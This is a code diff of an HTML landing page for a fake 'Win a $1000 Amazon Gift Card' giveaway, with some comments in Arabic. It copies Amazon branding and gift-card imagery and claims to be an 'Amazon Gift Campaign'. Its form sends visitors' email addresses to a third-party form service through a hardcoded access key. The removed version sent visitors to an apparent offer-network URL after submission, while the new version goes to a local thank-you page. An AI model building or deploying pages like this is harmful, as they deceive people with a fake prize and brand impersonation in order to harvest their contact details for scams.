@@ -1,97 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Win a $1000 Amazon Gift Card</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #e9f6f6;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
-    }
-    .box {
-      background: white;
-      padding: 30px 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 90%;
-      text-align: center;
-    }
-    .box img {
-      width: 100%;
-      border-radius: 8px;
-    }
-    .box input, .box button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    .box button {
-      background: #e48c00;
-      color: white;
-      font-weight: bold;
-      border: none;
-    }
-    .thankyou {
-      display: none;
-      text-align: center;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>$1 000 Amazon Gift Card</title>
+
+<!-- ==== أسلوب مدمج سريع ==== -->
+<style>
+:root{
+  --brand:#e48c00;
+  --dark:#002742;
+  --bg:#eaf6f6;
+  --radius:12px;
+}
+*{box-sizing:border-box;margin:0}
+body{
+  font-family:Poppins,Arial,sans-serif;
+  background:var(--bg);
+  display:flex;flex-direction:column;min-height:100vh
+}
+header{
+  background:var(--dark);color:#fff;text-align:center;
+  padding:18px 10px;font-size:22px;font-weight:600
+}
+main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
+.card{
+  max-width:480px;width:100%;background:#fff;border-radius:var(--radius);
+  padding:32px 24px;box-shadow:0 6px 20px rgb(0 0 0/10%)
+}
+.card h1{color:var(--brand);font-size:26px;margin-bottom:10px;text-align:center}
+.card p{font-size:15px;text-align:center;margin-bottom:18px;color:#333}
+.card img{width:100%;border-radius:8px;margin-bottom:22px}
+form{display:flex;flex-direction:column;gap:12px}
+input[type=email]{
+  padding:14px;font-size:16px;border:1px solid #ccc;border-radius:8px
+}
+button{
+  padding:14px;font-size:17px;font-weight:600;color:#fff;background:var(--brand);
+  border:none;border-radius:8px;cursor:pointer;transition:.3s
+}
+button:hover{background:#c77d00}
+footer{
+  text-align:center;padding:14px 0;font-size:14px;color:#666
+}
+/* شاشة حاسب */
+@media(min-width:1024px){
+  .card{max-width:700px;padding:40px}
+  .card h1{font-size:32px}
+  .card p{font-size:18px}
+  button{font-size:18px}
+}
+</style>
 </head>
+
 <body>
 
-  <div class="box" id="formBox">
-    <h2>Win a $1000 Amazon Gift Card!</h2>
+<header>Limited-Time&nbsp;Giveaway</header>
+
+<main>
+  <div class="card">
+    <h1>Win a $1000 Amazon Gift Card!</h1>
     <p>Enter your email below and claim your chance. This offer won't last long!</p>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
-    
+
+    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card"/>
+
     <form id="leadForm">
-      <input type="email" name="email" placeholder="Enter your email" required />
-      <input type="hidden" name="access_key" value="0dcca38e-523a-4c4a-9f0c-1488002d5763" />
-      <button type="submit">Claim Now</button>
+      <input type="email" name="email" placeholder="Enter your email" required>
+      <button type="submit">Claim&nbsp;Now</button>
     </form>
   </div>
+</main>
 
-  <div class="thankyou" id="thankYouBox">
-    <h2>Thank you!</h2>
-    <p>Redirecting to your offer...</p>
-  </div>
+<footer>&copy; 2025 Amazon Gift Campaign. All rights reserved.</footer>
 
-  <script>
-    document.getElementById("leadForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const form = e.target;
-
-      fetch("https://api.web3forms.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          access_key: form.access_key.value,
-          email: form.email.value
-        })
-      }).then(response => {
-        if (response.ok) {
-          document.getElementById("formBox").style.display = "none";
-          document.getElementById("thankYouBox").style.display = "block";
-          setTimeout(() => {
-            window.location.href = "https://singingfiles.com/show.php?l=0&u=178843&id=68652";
-          }, 3000);
-        } else {
-          alert("There was an error, please try again.");
-        }
-      });
+<!-- =============  JS  ============= -->
+<script>
+document.getElementById('leadForm').addEventListener('submit',async e=>{
+  e.preventDefault();
+  const fd=new FormData(e.target);
+  fd.append('access_key','0dcca38e-523a-4c4a-9f0c-1488002d5763');   // مفتاحك
+  try{
+    const r=await fetch('https://api.web3forms.com/submit',{
+      method:'POST',
+      body:fd
     });
-  </script>
-
+    if(r.ok){
+      window.location.href='thankyou.html';
+    }else{
+      alert('Submission failed, please try again later.');
+    }
+  }catch(err){
+    alert('Network error, please try again.');
+  }
+});
+</script>
 </body>
 </html>
